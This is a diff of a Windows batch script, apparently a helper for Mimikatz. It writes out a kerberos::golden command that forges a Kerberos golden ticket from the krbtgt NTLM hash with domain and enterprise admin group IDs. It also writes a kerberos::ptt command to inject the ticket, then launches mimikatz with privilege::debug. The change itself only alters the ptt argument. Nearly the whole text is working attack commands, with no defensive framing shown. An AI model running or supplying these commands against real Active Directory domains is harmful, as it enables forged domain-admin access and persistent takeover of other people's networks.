@@ -44,6 +44,6 @@ cls
 echo "Copy and paste this line into mimikatz once it launches in privileged mode:" > .\output\mimikatz.txt
 echo "kerberos::golden /user:%username% /domain:%domain% /sid:%sid% /krbtgt:%ntlmhash% /groups:513,512,520,518,519 /id:500 /ticket:%ticket%" >> .\output\mimikatz.txt
 echo "To pass this ticket to your current session after generation, run:" >> .\output\mimikatz.txt
-echo "kerberos::ptt %username%@%ticket%" >> .\output\mimikatz.txt
+echo "kerberos::ptt %ticket%" >> .\output\mimikatz.txt
 start notepad.exe ".\output\mimikatz.txt"
 mimikatz "privilege::debug"
